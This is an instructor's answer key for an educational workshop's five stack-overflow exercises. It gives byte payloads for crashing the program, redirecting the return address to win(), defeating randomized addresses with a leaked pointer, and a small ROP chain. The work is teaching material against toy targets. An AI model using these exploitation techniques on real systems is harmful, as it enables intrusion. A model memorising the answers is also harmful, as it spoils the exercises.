# Imagine RIT — Admin Writeup

Solutions for all 5 exercises in the Imagine RIT workshop.

---

## Exercise 01: The Stack Frame

No input needed. Just click **Step** 4 times to watch the stack frame build up.

---

## Exercise 02: The Overflow

Send more than 20 bytes to overwrite the go-back address with garbage and crash the program.

```
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
```

(24 bytes of 0x41 — fills the 16-byte buffer, overwrites 4-byte bookmark, trashes the go-back address)

---

## Exercise 03: Hijack Execution

Overflow the buffer and overwrite the go-back address with win() at `0x08048150`.

```
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 42 50 81 04 08
```

Breakdown:
- `41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41` — 16 bytes buffer padding
- `42 42 42 42` — 4 bytes overwrite the bookmark (junk)
- `50 81 04 08` — win() address `0x08048150` in little-endian

---

## Exercise 04: Randomized Addresses

Addresses change every run. Read the leaked main() address from the log, add `0x150` to get win().

Example: if main is leaked as `0x08248000`, then win = `0x08248000 + 0x150 = 0x08248150`.

```
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 42 [win address in little-endian]
```

Use the hex calculator in the exercise to compute the address, then enter it backwards (least significant byte first).

---

## Exercise 05: Baby's First ROP

One gadget at `0x08048300` that does: `pop eax; pop ebx; mov [ebx], eax; ret`

Goal: write `0xdeadbeef` into `flag_check` at `0x0804a040`, then jump to win() at `0x08048150`.

```
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 42 00 83 04 08 ef be ad de 40 a0 04 08 50 81 04 08
```

Breakdown:
- `41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41` — 16 bytes buffer padding
- `42 42 42 42` — 4 bytes overwrite the bookmark
- `00 83 04 08` — gadget address `0x08048300` (overwrites go-back address)
- `ef be ad de` — `0xdeadbeef` (gadget pops this into eax)
- `40 a0 04 08` — `0x0804a040` (gadget pops this into ebx)
- `50 81 04 08` — win() address `0x08048150` (gadget's `ret` jumps here after writing eax to [ebx])

The gadget writes 0xdeadbeef to flag_check, then returns into win(), which sees the correct value and prints the flag.
